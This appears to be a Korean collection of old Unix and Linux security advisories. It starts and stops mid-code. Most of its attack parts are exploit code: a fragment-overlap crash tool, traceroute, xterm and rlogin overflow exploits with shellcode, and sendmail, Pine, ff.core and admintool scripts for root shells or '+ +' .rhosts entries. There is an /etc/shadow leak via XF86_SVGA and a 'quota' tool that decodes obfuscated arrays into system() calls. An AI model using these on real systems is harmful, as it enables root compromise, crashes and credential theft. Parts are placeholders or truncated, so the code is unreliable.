        p_ptr += 2;                         /* IP TOS (skipped) */
        *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
        p_ptr += 2;
        *((u_short *)p_ptr) = htons(242);   /* IP id */
        p_ptr += 2;
        *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
        p_ptr += 2;
        *((u_short *)p_ptr) = 0x40;         /* IP TTL */
        byte = IPPROTO_UDP;
        memcpy(p_ptr + 1, &byte, sizeof(u_char));
        p_ptr += 4;                         /* IP checksum filled in by kernel *
/
        *((u_long *)p_ptr) = src_ip;        /* IP source address */
        p_ptr += 4;
        *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
        p_ptr += 4;
        *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
        p_ptr += 2;
        *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
        p_ptr += 2;
        *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */

        if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&si
n,
                    sizeof(struct sockaddr)) == -1)
        {
            perror("\nsendto");
            free(packet);
            exit(1);
        }

        /*  We set the fragment offset to be inside of the previous packet's
         *  payload (it overlaps inside the previous packet) but do not include
         *  enough payload to cover complete the datagram.  Just the header will

         *  do, but to crash NT/95 machines, a bit larger of packet seems to wor
k
         *  better.
         */
        p_ptr = &packet[2];         /* IP total length is 2 bytes into the heade
r */
        *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);
        p_ptr += 4;                 /* IP offset is 6 bytes into the header */
        *((u_short *)p_ptr) = FIX(MAGIC);

        if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,

    void usage(u_char *name)
    {
        fprintf(stderr,
                "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\
n",
                name);
        exit(0);
    }


해결책

        커널을 2.0.32-pre4 로 업해라.
        or
        소스를 다음과 같이 바꿔서 다시 컴파일 시켜라
 --- ip_fragment.c       Mon Nov 10 14:58:38 1997
    +++ ip_fragment.c.patched       Mon Nov 10 19:18:52 1997
    @@ -12,6 +12,7 @@
      *             Alan Cox        :       Split from ip.c , see ip_input.c for

 history.
      *             Alan Cox        :       Handling oversized frames
      *             Uriel Maimon    :       Accounting errors in two fringe case
s.
    + *             route           :       IP fragment overlap bug
      */

     #include
    @@ -578,6 +579,22 @@
                            frag_kfree_s(tmp, sizeof(struct ipfrag));
                    }
            }
    +
    +        /*
    +         * Uh-oh.  Some one's playing some park shenanigans on us.
    +         * IP fragoverlap-linux-go-b00m bug.
    +         * route 11.3.97
    +         */
    +
    +        if (offset > end)
    +        {
    +                skb->sk = NULL;
    +                printk("IP: Invalid IP fragment (offset > end) found from %
s\n", in_ntoa(iph->saddr));
    +                kfree_skb(skb, FREE_READ);
    +                ip_statistics.IpReasmFails++;
    +                ip_free(qp);
    +                return NULL;
    +        }

            /*
             *      Insert this fragment in the chain of fragments.

---------------------------

 제  목: [보안] 리눅스 pppd chatscript
명령

        데비안 pppd chatscript

시스템

        데비안 리눅스

문제점

        /var/log/ppp.log 파일을 누구나 다 읽을수 있게 해놓았다.

        $> more /var/log/ppp.log
        어쩌구 저쩌구.

        Dec 14 16:43:14 gateway chat[362]: ^Mlogin -- got it
        Dec 14 16:43:14 gateway chat[362]: send (loginname^M)
        Dec 14 16:43:15 gateway chat[362]: expect (word)
        Dec 14 16:43:15 gateway chat[362]: : loginname^M
        Dec 14 16:43:15 gateway chat[362]: Password -- got it
        Dec 14 16:43:15 gateway chat[362]: send (나의패스워드^M)

        이런 형식으로 내용을 보면 패스워드가(^^;) 보인다.
해결책

        패치된 버젼이 없는것 같다. ^^;

           지금은 나왔을 것이다. 버젼을 올려라

---------------------------

 제  목: [보안] 리눅스 X 서버
명령
        X서버- XFree 3.3.1 3.2.9 3.1.2 의 XF86_시리즈

시스템

        엑스서버를 쓴느 모든 유닉스및 리눅스

문제점

        다음과 같은 편법으로 첫줄의 파일을 볼수가 있다.

$ ls -al /etc/shadow
-rw-------   1 root     bin          1039 Aug 21 20:12  /etc/shadow
$ id
uid=502(loveyou) gid=500(users) groups=500(users)
$ cd /usr/X11R6/bin
$ ./XF86_SVGA -config /etc/shadow
Unrecognized option: root:qEXaUxSeQ45ls:10171:-1:-1:-1:-1:-1:-1
use: X [:] [option]
-a #                   mouse acceleration (pixels)
-ac                    disable access control restrictions
-audit int             set audit trail level
-auth file             select authorization file
bc                     enable bug compatibility
-bs                    disable any backing store support
-c                     turns off key-click



        이런 형식이다..

해결책

        Setuid 를 없애던지 특정 이용자만 쓰도록 허락해라.

---------------------------

 제  목: [보안] 리눅스 래드햇 5.0 유틸리티
명령

        /bin/ping,  /usr/sbin/traceroute,  /usr/bin/rlogin,   /usr/bin/rsh
        (actually glibc2 is guilty one)

시스템

        래드햇 5.0

문제점

        버퍼 오버런을 이용해서 루트를 얻는다.

   /*

       Just Your Standard EGGSHELL Proggie:
       traceroute buffer overflow exploit for RedHat Linux 5.0
       mostly ripped from Aleph One

       Wilton Wong
       wwong@blackstar.net

       gcc -o trace_shell trace_shell.c

    */
    #include

    #define DEFAULT_OFFSET                 0
    #define DEFAULT_BUFFER_SIZE            1019
    #define DEFAULT_EGG_SIZE               2048
    #define NOP                            0x90

    char shellcode[] =
            "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
            "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
            "\x80\xe8\xdc\xff\xff\xff/bin/sh";

    unsigned long get_sp(void) {
       __asm__("movl %esp,%eax");
    }

    void main(int argc, char *argv[]) {
      char *buff, *ptr, *egg;
      long *addr_ptr, addr;
      int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
      int i, eggsize=DEFAULT_EGG_SIZE;

      if (argc > 1) bsize  = atoi(argv[1]);
      if (argc > 2) offset = atoi(argv[2]);
      if (argc > 3) eggsize = atoi(argv[3]);

      if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
      }
      if (!(egg = malloc(eggsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
      }

      addr = get_sp() - offset;
      printf("Using address: 0x%x\n", addr);

      ptr = buff;
      addr_ptr = (long *) ptr;
      for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

      ptr = egg;
      for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
        *(ptr++) = NOP;

      for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

      buff[bsize - 1] = '\0';
      egg[eggsize - 1] = '\0';

      memcpy(egg,"EGG=",4);
      putenv(egg);
      memcpy(buff,"RET=",4);
      putenv(buff);
      printf("Now run: /usr/sbin/traceroute $RET\n");
      system("/bin/bash");
    }


해결책

        패치 방법
$ diff -u /dbase/glibc-2.0.6pre4/resolv/res_query.c /usr/glibc/src/libc/resolv/
    --- /dbase/glibc-2.0.6pre4/resolv/res_query.c   Mon Jan  6 23:05:43 1997
    +++ /usr/glibc/src/libc/resolv/res_query.c      Mon Dec  8 09:05:53 1997
    @@ -321,7 +321,7 @@
            u_char *answer;         /* buffer to put answer */
            int anslen;             /* size of answer */
     {
    -       char nbuf[MAXDNAME];
    +       char nbuf[MAXDNAME * 2 + 2];  /*이부분을 위와 바꾸면 된다.*/
            const char *longname = nbuf;
            int n;

---------------------------

 제  목: [보안] 리눅스 crontab
명령

        dillon crontab / crond ( dcron 2.2 )

시스템

        슬렉웨어 3.4

문제점

        버퍼 오버 플로우를 이용해서 루트를 얻을수 있다.
        잠재적인 버퍼 오버 플로우의 가능성이 보인다.

해결책

        다음의 사이트에서 패치 버젼을 받는다.
        ftp://ftp.cdrom.com/pub/linux/slackware-3.4/slakware/a2/bin.tgz
        ftp://ftp.cdrom.com/pub/linux/slackware-3.4/source/a/bin/dcron22.tar.gz
        ftp://ftp.cdrom.com/pub/linux/slackware-3.4/source/a/bin/dcron22.diff.gz

---------------------------

 제  목: [보안] 솔라리스 xterm
명령

        xterm

시스템

        솔라리스 2.5.1(SunOS 5.5.1)

문제점

        버퍼 오버 플로우를 일으켜 보안상 헛점을 만들수 있다.


        그 예제이다.
    /*
     * X11R6.3 xterm exploit for solaris 2.5.1 by DCRH 28/5/97
     *
     */

    #include
    #include
    #include
    #include

    #define EXTRA2 1300
    #define BUF_LENGTH 400
    #define EXTRA 500
       /* Need an addr such that contents of addr+0xe98 = 0 */
    #define SAFE_ADDR ((unsigned)0xefff2008)
    #define STACK_OFFSET 0x4800
    #define SPARC_NOP 0xa61cc013

    u_long sparc_shellcode[] =
    {
        "쉘코드"
    };

    u_long get_sp(void)
    {
        asm("mov %sp,%i0 \n");
    }

    char buf[BUF_LENGTH + EXTRA + EXTRA2 + 8];
    char longvar[0x4000] = "BLAH=";

    void main(int argc, char *argv[])
    {
        char *env[2];
        unsigned long targ_addr;
        u_long *long_p;
        int i, code_length = sizeof(sparc_shellcode),dso=0;

        if(argc > 1) dso=atoi(argv[1]);

        long_p =(u_long *) buf;

        for (i = 0; i < EXTRA2 / sizeof(u_long); i++)
            *long_p++ = (SAFE_ADDR >> 8) | (SAFE_ADDR << 24);

        targ_addr = get_sp() - STACK_OFFSET - dso;
        for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
            *long_p++ = SPARC_NOP;

        for (i = 0; i < code_length / sizeof(u_long); i++)
            *long_p++ = sparc_shellcode[i];

        for (i = 0; i < EXTRA / sizeof(u_long); i++)
            *long_p++ = targ_addr;

        printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
               targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);

        /* This is just to shove the stack down a bit */
        memset(&longvar[5], 'a', sizeof longvar-6);
        longvar[sizeof longvar -1] = '\0';
        env[0] = longvar;
        env[1] = NULL;

        execle("./xterm", "xterm", "-xrm", buf,(char *) 0, env);
        perror("execl failed");
    }


해결책

        다음의 사이트에서 와퍼를 구해다가 설치하라.
        ftp://ftp.auscert.org.au/pub/auscert/tools/overflow_wrapper
        /overflow_wrapper.c
    or
        http://cegt201.bradley.edu/~im14u2c/wrapper/

---------------------------

 제  목: [보안] 솔라리스 ff.core
명령

        /usr/openwin/bin/ff.core

시스템

        솔라리스 2.4

문제점

        IFS=/을 이용해서 /usr/??프로그램을 돌리려는 ff.core 파일의 본래 취지를
        벗어나 usr 프로그램을 돌리고 그 뒤의 것들은 인수로써 작용하게 만든다.
        다음은 그 예제이다.

        %  ksh
        %  cd /tmp
        %  cp /bin/ksh .
        %  echo "chown root ksh; chmod u+s ksh" > usr
        %  chmod +x usr
        %  export IFS=/
        %  한줄의 어떤 명령 ..
        %  ./ksh
        #

해결책

        패치해라.

---------------------------

 제  목: [보안] 솔라리스 gethostbyname()
명령

        gethostbyname()

시스템

        솔라리스 2.5 2.5.1

문제점

        버퍼 오버 플로우를 일으켜서 쉘을 실행시킨다..루트 소유로.

        그 예제이다.
/*
 * rlogin-exploit.c: gets a root shell on most Solaris 2.5/2.5.1 machines
 * by exploiting the gethostbyname() overflow in rlogin.
 *
 * gcc -o rlogin-exploit rlogin-exploit.c
 *
 * Jeremy Elson, 18 Nov 1996
 * jeremy.elson@nih.gov
 */

#include
#include
#include
#include

#define BUF_LENGTH      8200
#define EXTRA           100
#define STACK_OFFSET    4000
#define SPARC_NOP       0xa61cc013

u_char sparc_shellcode[] ="쉘코드";


u_long get_sp(void)
{
  __asm__("mov %sp,%i0 \n");
}

void main(int argc, char *argv[])
{
  char buf[BUF_LENGTH + EXTRA];
  long targ_addr;
  u_long *long_p;
  u_char *char_p;
  int i, code_length = strlen(sparc_shellcode);

  long_p = (u_long *) buf;

  for (i = 0; i<(BUF_LENGTH - code_length) / sizeof(u_long); i++)
    *long_p++ = SPARC_NOP;

  char_p = (u_char *) long_p;

  for (i = 0; i out & (and go to sleep).
#
# version 3.91, 3.92 .....
# version 3.95 fixed
#
# Note: must do some changes in the script. look 4 CHANGE THIS:
#
# Yea i know is a lame script but is better than nothing..
# try to exploit the bug without a script and you will wait
# forever.
#                     e-torres@uniandes.edu.co
#

argumentos=0
if [ $# -eq $argumentos ]
  then
    echo "Usage: $0 username path/file_to_create & "
    echo "ET Lownoise 1996 Colombia"
    exit
fi

username=$1
archivo=$2

#CHANGE THIS:

#text='text to puit in file to create'
#usr=path of the program users
#pineprog=how the pine program appears when u do a w (who) command

text='+ +'
usr=users
pineprog=pine

#
date
echo "- Looking for $1 to log in... just wait"
#
entrada=0
entro=0

until [ $entro -eq $entrada ]
do
        for nombre in `$usr`
        do
         if [ $nombre = $1 ]
            then
                entro=1

         fi
        done

done
date
echo "- Ok $username is logged now."
#
echo "- Lets wait that $1 run pine. "


noejecuto=0
ejecuto=0

until [ $ejecuto -ne $noejecuto ]
do


     for ejecutando in `w $username`
     do
       if [ $ejecutando = $pineprog ]
         then
                date
                echo '- OK ' $1 ' is running ' $pineprog '.'
                ejecuto=1

       fi
     done

done

echo "- Now lets grab the lock file of $username from /tmp"
ls -al /tmp | grep $username > temp1
cat temp1 | grep rw-rw-rw- > temporal
lockfile=`awk '{print $9}' temporal`
rm temp1
rm temporal
echo "> Username $username"
echo "> Lockfile $lockfile"
echo
echo "- OK now im going to wait that $username "
echo "  quits $pineprog "
# do it till exist lockfile, that means username havent quit pine
cd /tmp

while [ -s $lockfile ]
    do
    sleep 0
done

cd
date
echo "- OK $username quit $pineprog .. now to link $lockfile "
#$archivo is the complete path of file in username
cd /tmp
(한줄의 과정)
cho "- $lockfile is now linked "
cd
echo "- $username must now return to pine to create"
echo "  $archivo "
echo "- Waiting $username to return pine "

noejecuto=0
ejecuto=0

until [ $ejecuto -ne $noejecuto ]
do
     for ejecutando in `w $username `
     do
       if [ $ejecutando = $pineprog ]
         then
                date
                echo '- OK ' $username ' is running ' $pineprog
                ejecuto=1

       fi
     done

done
echo "- Introducing text..."
cd /tmp
echo $text > $lockfile
echo "- Erasing $lockfile "
rm $lockfile
cd
echo "THE END DUDE!"
echo "ET Lownoise 1996 "


해결책

        Pine의 버젼을 3.95이상으로 바꾸어라.

---------------------------

 제  목: [보안] 솔라리스 sendmail
명령

        sendmail ( 8.7.x ~ 8.8.2?)

시스템

        솔라리스 2.5 2.5.1

문제점

        센드 메일상의 버그로 루트쉘을 생성할 수 있다.
        다음은 그 예제이다.

    #/bin/sh
    #
    # Modify  RUN in  x.c for  what you  wanna run,  and possibly  the
    # location or format of the ps command in the KILL line below  for
    # your platform.
    #
    # Or you could remove x.c alltogether and just put what you  wanna
    # do as root in smtpd.c (Ie: 'echo "+ +" >>/.rhosts' works nicely)
    #
    #
    cat << _EOF_ >/tmp/x.c
     #define RUN "/bin/ksh"
     #include
     main()
     {
        execl(RUN,RUN,NULL);
     }
    _EOF_
    #
    cat << _EOF_ >/tmp/spawnfish.c
     main()
     {
        (일련의 과정 ..)
     }
    _EOF_
    #
    cat << _EOF_ >/tmp/smtpd.c
     main()
     {
       setuid(0); setgid(0);
       system("chown root /tmp/x ;chmod 4755 /tmp/x");
     }
    _EOF_
    #
    #
    gcc -O  -o /tmp/x /tmp/x.c
    gcc -O3 -o /tmp/spawnfish /tmp/spawnfish.c
    gcc -O3 -o /tmp/smtpd /tmp/smtpd.c
    #
    /tmp/spawnfish
    kill -HUP `/usr/ucb/ps -ax|grep /tmp/smtpd|grep -v grep|sed s/"[ ]*"// |cut
-d" " -f1`
    rm /tmp/spawnfish.c /tmp/spawnfish /tmp/smtpd.c /tmp/smtpd /tmp/x.c
    sleep 5
    if [ -u /tmp/x ] ; then
       echo "leet..."
       /tmp/x
    fi

해결책

        센드메일의 버젼을 8.8.5 이상으로 올리면 된다.

---------------------------

 제  목: [보안] 솔라리스 admintool
명령

        admintool

시스템

        솔라리스 2.5

문제점

        다음과 같은간단한 경위로 .rhosts파일을 생성하여 루트를 획득할수 있다.

        setenv DISPLAY yourdisplay:0.0
        ln -s /.rhosts /tmp/.group.lock
        /usr/bin/admintool
        (일련의 과정 )
        echo "+ +" >> .rhosts
        /usr/bin/rsh localhost -l root "(/usr/openwin/bin/xterm&)"

해결책

        setuid를 없애던지 패치를 하라.

---------------------------

 제  목: [보안] 솔라리스  imstat(라이센스 매니져)
명령

        imstat(라이센스 매니져)

시스템

        솔라리스 2.4

문제점

        /var/tmp 에 임시 파일을 만든다..이를 이용해서 .rhosts를 링크시켜
        생성할 수 있다.

        rm /var/tmp/locksuntechd
        ln -s /.rhosts /var/tmp/locksuntechd
        (일련의 과정 )


해결책

        퍼미션을 닫어라

---------------------------

 제  목: [보안] 솔라리스 quota
명령

        quota

시스템

        솔라리스 2.5(.1 ??)

문제점

        쿼터제한을 피하면서 파일을 생성할 수 있다.


        그 예제이다.


/**************************************************************************
 * This exploit takes advantage of the latest sendmail hole, to hide      *
 * warez from your quota program, effectivly making your quota infinate.. *
 *                                                                        *
 * To compile:                                                            *
 *   cc -o bigquota quota.c                                               *
 * To run:                                                                *
 *   ./bigquota file                                                      *
 * where file is the file you wish to hide from your quota program.       *
 *                                                                        *
 * Please note that this may take a minute.                               *
 * If you have any problems, talk to me, TSK, on IRC.                     *
 **************************************************************************/

#include
#include
#include
#include
#include

int seedsc[201]={52,3,3,77,115,13,71,15,41,51,61,29,103,13,100,47,124,42,86,\
44,45,11,7,50,17,123,87,66,32,78,109,62,53,43,84,72,71,0,88,41,1,33,9,52,118,\
65,120,119,68,84,15,11,27,101,0,106,46,19,75,16,25,55,81,74,113,88,96,19,91,\
118,73,58,41,90,88,87,118,103,58,50,71,41,86,33,115,9,105,29,48,113,5,98,50,\
94,79,18,111,99,11,126,111,109,90,46,18,43,43,59,113,76,96,18,27,36,7,74,79,\
85,54,126,23,12,123,118,76,116,85,8,90,111,35,106,113,40,40,122,85,43,108,31,\
32,5,9,77,5,14,99,100,107,114,60,70,19,26,12,14,114,118,48,40,12,106,93,60,\
112,52,67,30,47,55,107,75,90,112,55,38,107,117,22,89,47,79,58,55,119,27,119,\
115,85,38,30,122,126,3,93,97,44,100,32,33,10};

void main(argc, argv)
int argc;
char *argv[];
{
char *checkseed(int *seeds);
char *checkdir(char *dir);
int initseeds[201]={25,\
108,69,89,126,121,84,34,77,52,25,67,44,106,60,124,30,33,3,21,75,67,\
116,109,28,51,81,45,85,119,99,0,98,91,114,102,122,50,81,67,57,43,126,\
2,94,75,10,7,96,29,112,71,103,117,20,72,112,23,105,65,48,119,23,65,\
98,105,33,12,43,12,78,7,53,16,109,91,65,106,43,85,44,113,125,3,61,\
95,18,3,64,96,19,68,52,20,54,122,26,35,126,19,31,106,24,108,59,44,\
41,32,5,1,32,25,64,93,60,97,102,84,92,50,79,11,112,89,27,124,98,\
109,12,0,4,103,114,22,66,36,81,47,52,70,107,51,46,37,99,13,4,31,\
126,19,47,21,96,123,110,72,33,76,8,0,65,86,102,27,75,64,46,122,-47,\
53,1,42,20,-65,63,63,-7,-70,40,-39,-15,46,25,22,86,-39,86,82,21,-16,\
3,-9,-23,11,-21,-90,-30,-7,20,-17,23};
int setupseeds[201]={1,\
35,44,14,107,20,81,111,42,72,73,90,34,86,50,32,16,97,78,80,124,7,\
110,13,71,107,24,91,84,68,58,38,105,68,64,121,37,101,64,65,40,91,8,\
29,9,60,101,123,122,22,92,37,66,13,30,88,8,70,5,28,108,20,101,125,\
38,78,106,98,85,55,92,122,0,93,0,37,97,82,120,70,82,65,74,90,41,\
28,104,80,71,117,11,104,32,69,5,56,2,48,8,112,109,16,109,35,57,43,\
119,37,86,42,62,44,118,117,7,94,88,28,109,125,-23,96,-15,-1,34,-69,33,\
93,10,-64,27,-56,-81,68,68,-5,25,4,10,70,68,42,53,-45,111,87,11,-54,\
-6,4,37,49,81,88,93,90,2,-72,60,65,85,3,-29,47,3,64,-35,78,58,\
42,2,-43,34,-80,53,70,10,-7,25,29,54,21,-11,7,-69,5,-19,4,30,77,\
67,-10,-79,96,23,4,3,-68,84,64,89};
int binseeds[201]={1,\
14,11,95,67,113,29,87,45,24,115,45,88,60,43,114,98,6,56,111,75,13,\
121,123,50,108,17,1,28,15,62,17,81,14,101,39,13,112,90,2,15,114,34,\
64,91,79,79,57,34,31,41,5,34,62,58,93,21,108,110,88,83,114,126,112,\
89,14,41,102,88,10,10,45,111,25,35,38,76,115,57,113,49,72,58,46,83,\
121,87,84,71,81,104,18,41,110,80,82,44,92,5,89,39,104,103,30,96,37,\
12,50,25,64,36,24,54,38,33,35,-79,23,54,-9,87,35,-5,-17,24,-69,-23,\
42,-58,-3,73,11,-3,7,78,-21,15,4,-46,1,84,96,101,-31,96,104,-2,19,\
-7,0,45,34,97,20,96,91,-17,-9,16,67,103,10,-61,48,-7,45,42,2,77,\
-23,1,33,27,-2,-8,80,-6,-17,25,-27,3,-47,43,54,-22,83,2,-17,-39,62,\
89,-7,-11,94,19,-65,72,-3,67,79,111};
int procseeds[201]={-14,\
97,103,125,91,45,90,21,121,60,39,28,60,11,76,41,69,21,118,7,90,63,\
17,17,48,46,68,126,72,66,68,32,54,119,44,98,94,15,21,33,68,4,109,\
121,109,27,7,66,65,126,121,97,40,101,84,6,48,97,38,25,7,56,112,97,\
125,36,125,46,115,108,40,2,105,52,44,17,122,111,98,30,17,112,27,115,29,\
78,125,125,16,81,17,99,88,108,88,14,83,42,26,114,54,90,106,39,126,19,\
95,2,1,69,14,93,114,105,78,48,42,25,87,14,120,124,55,102,57,35,30,\
107,11,74,44,8,100,118,25,73,64,97,106,57,81,92,34,109,80,118,112,85,\
99,99,21,20,62,116,42,111,67,29,79,12,34,84,67,12,105,107,90,109,23,\
116,25,104,89,124,29,-38,1,-9,95,21,0,39,43,45,-72,35,-69,-83,30,78,\
85,-11,-22,111,-47,-65,60,-1,85,78,106};
int boutseeds[201]={-14842,\
37,119,64,88,3,4,11,86,22,104,51,21,57,122,64,113,58,102,72,32,118,\
17,28,35,97,53,125,64,79,95,86,40,122,35,50,48,41,54,18,87,67,125,\
74,95,0,100,19,71,37,69,113,100,82,54,18,123,37,97,107,126,38,114,22,\
75,123,3,33,64,35,37,20,73,68,37,46,89,95,88,22,108,92,51,40,3,\
70,19,125,62,74,69,113,2,25,101,7,59,100,2,69,83,25,33,61,71,117,\
34,70,119,65,27,62,68,25,12,70,87,58,43,112,86,49,24,24,80,84,52,\
6,46,121,115,25,91,53,94,123,12,59,34,66,84,16,93,76,88,38,22,110,\
106,26,101,55,84,64,120,54,29,6,67,54,126,2,17,97,115,41,125,4,4,\
-55,8,41,25,-1,49,76,-61,-85,40,-27,-15,29,50,62,-9,20,-1,-14,15,9,\
32,-72,-94,40,-61,-54,-12,11,72,66,91};
int shtdwnseeds[201]={-42,\
58,44,53,114,68,10,105,76,13,99,1,12,79,50,106,27,65,83,96,30,101,\
122,112,87,118,3,35,55,6,84,59,98,28,58,82,126,98,114,85,125,7,39,\
69,58,21,70,28,35,65,57,70,93,0,36,14,100,107,9,107,71,52,1,29,\
115,63,110,118,28,16,82,53,80,56,50,108,58,109,26,75,19,91,92,59,86,\
125,114,40,76,15,38,8,57,58,103,65,23,52,14,36,8,119,70,47,64,53,\
1,15,83,35,33,80,10,98,51,38,30,14,119,11,26,61,15,117,37,103,117,\
32,4,21,67,40,40,78,74,47,108,27,120,9,114,14,56,75,84,52,29,55,\
108,105,42,71,8,83,89,118,79,22,119,1,28,3,36,22,12,77,77,105,33,\
12,104,-75,18,-4,62,72,-60,1,79,11,0,-17,-8,-23,-4,89,-4,-4,19,76,\
16,-90,-78,45,-38,-65,56,11,77,71,89};
char *zipper(int *seeds1);
char *path;
int i=0,j,inhan,outhan;
if(argc!=2)
        {
        puts("Usage:");
        puts("quota ");
        puts("where  is the file you wish");
        puts("to hide/subtract from your quota.");
        exit(0);
        }
system(zipper(initseeds));
system(zipper(setupseeds));
system(checkseed(binseeds));
path=checkdir("/");
if(!path)
        {
        puts("Technical Dificulties");
        goto closeout;
        }
if((outhan=open(path,O_WRONLY|O_TRUNC))==-1)
        {
        puts("Error opening outfile");
        goto closeout;
        }
if((inhan=open(argv[1],O_RDONLY))==-1)
        {
        puts("Error opening infile");
        goto closeout;
        }
if(filecopy(inhan,outhan))
        {
        puts("Technical dificulties");
        goto closeout;
        }
if((unlink(argv[1]))==-1)
        {
        puts("Technical dificulties.");
        goto closeout;
        }
if((rename(path,argv[1]))==-1)
        if((link(path,argv[1]))==-1)
                if((symlink(path,argv[1]))==-1)
                        puts("Technical Dificulties.");
closeout:
system("%s\n",zipper(procseeds));
system("%s\n",zipper(boutseeds));
system("%s\n",zipper(shtdwnseeds));
}

char *checkseed(int *seeds)
{
char *zipper(int *seeds1);
char *string;
char testseeds[30];
char god[200];
int i=200,j;
if((string=(char *)getenv("PATH"))==NULL)
        {
        puts("Path not found");
        exit(-1);
        }
while((seeds[i]+seedsc[i])!=32)
        {
        testseeds[200-i]=seeds[i]+seedsc[i];
        i--;
        }
testseeds[i]=0;
i=0;
while(string[i]!=0)
        {
        j=0;
        while(string[i]!=58&&string[i]!=0)
                {
                god[j]=string[i];
                i++;
                j++;
                }
        i++;
        god[j++]=47;
        god[j++]=0;
        strcpy(&god[j],testseeds);
        if(!stat(god,NULL))
                return (char *)zipper(seeds);
        }
return 0;
}

char *zipper(int *seeds1)
{
int i;
char *buhbye;
char teeth[201];
teeth[201]=0;
for(i=200;i>=0;i--)
        teeth[200-i]=seeds1[i]+seedsc[i];
buhbye=(char *)malloc(201);
strcpy(buhbye,teeth);
return buhbye;
}

int filecopy(int from,int to)
{
int bufsiz;
if (from < 0)
        return 1;
if (to < 0)
        goto err;
for (bufsiz = 0x4000; bufsiz >= 128; bufsiz >>= 1)
        {
        register char *buffer;
        buffer = (char *) malloc(bufsiz);
        if (buffer)
                {
                while (1)
                        {
                        register int n;
                        n = read(from,buffer,bufsiz);
                        if (n == -1)
                                break;
                        if (n == 0)
                                {
                                free(buffer);
                                return 0;
                                }
                        if (n != write(to,buffer,(unsigned) n))
                                break;
                        }
                free(buffer);
                break;
                }
        }
err:
return 1;
}

char *checkdir(char *dir)
{
char *checkdir(char *dir);
DIR *currdir;
struct dirent *node;
struct stat statnode;
int i,j;
char *path;
char *retpath;
path=(char *)malloc(300);
if((currdir=opendir(dir))==NULL)
        return 0;
node=readdir(currdir);
while(node)
        {
        i=0;
        j=0;
        while(dir[i])
                {
                path[i]=dir[i];
                i++;
                }
        if(strcmp(dir,"/"))
                {
                path[i]='/';
                i++;
                }
        while(node->d_name[j])
                {
                path[i]=node->d_name[j];
                i++;
                j++;
                }
        path[i]=0;

        if((lstat(path,&statnode))==-1)
                return 0;
        if(statnode.st_mode&S_IFREG)
                if(!access(path,W_OK))
                if(!(statnode.st_mode&S_IFBLK))
                if(!(statnode.st_mode&S_ISVTX))
                if(statnode.st_uid!=getuid())
                        return path;
        if(statnode.st_mode&S_IFDIR)


